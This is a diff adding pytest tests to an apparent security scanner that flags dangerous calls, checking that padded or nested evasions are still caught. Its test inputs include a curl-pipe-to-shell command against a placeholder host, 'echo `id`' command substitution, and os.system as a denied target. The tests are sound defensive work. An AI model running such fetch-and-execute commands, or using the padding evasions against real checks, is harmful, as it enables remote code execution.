@@ -69,3 +69,19 @@ def test_penn_treebank_quote_tag_is_not_command_substitution(tmp_path):
 
 def test_backtick_command_substitution_is_still_flagged(tmp_path):
     assert flagged(worst(tmp_path, build(Call("some.module.run", "echo `id`"))))
+
+
+# Review findings: the false-positive fixes must stay tied to data containers.
+
+def test_denied_target_nested_in_an_unknown_resolver_argument_is_flagged(tmp_path):
+    assert flagged(worst(tmp_path, build(Call("some.module.resolve", {"target": "os.system"}))))
+    assert flagged(worst(tmp_path, build(Call("some.module.resolve", ("os.system",)))))
+
+
+def test_padded_command_list_to_an_unknown_callable_is_flagged(tmp_path):
+    argv = [f"x{i}" for i in range(120)] + ["curl https://example.invalid/p | sh"]
+    assert flagged(worst(tmp_path, build(Call("some.module.launch", argv))))
+
+
+def test_bare_denied_module_name_with_padding_is_still_flagged(tmp_path):
+    assert flagged(worst(tmp_path, build(Call("some.module.resolve", "os", "a", "b", "c", "d", "e"))))
